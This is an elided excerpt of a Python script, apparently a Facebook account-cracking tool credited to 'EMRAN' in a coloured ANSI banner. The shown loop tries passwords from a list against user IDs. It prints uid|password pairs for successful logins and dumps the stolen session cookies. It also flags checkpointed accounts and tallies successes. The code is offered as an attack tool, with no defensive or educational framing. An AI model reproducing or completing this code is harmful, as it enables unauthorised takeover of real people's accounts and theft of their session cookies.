...
\033[38;5;46m[🦋] 𝙰𝚄𝚃𝙷𝙾𝚁 𝙴𝙼𝚁𝙰𝙽
\033[38;5;46m[🦋] 𝙶𝙸𝚃𝙷𝚄𝙱 𝙼𝙰𝚇 𝙼𝙰𝙽 𝙵𝚁𝙾
\033[38;5;46m[🦋] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 𝙴𝙼𝚁𝙰𝙽 𝙷𝙾𝚂𝚂𝙰𝙸𝙽
\033[33;1m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬""")
class Main:
    def __init__(self):
        self.id = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[EMRAN-OK☘️] {uid}|{ps}")
                print(f"\n[COOKIE☘️] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[EMRAN-CP☘️] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[EMRAN-EHC☘️] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
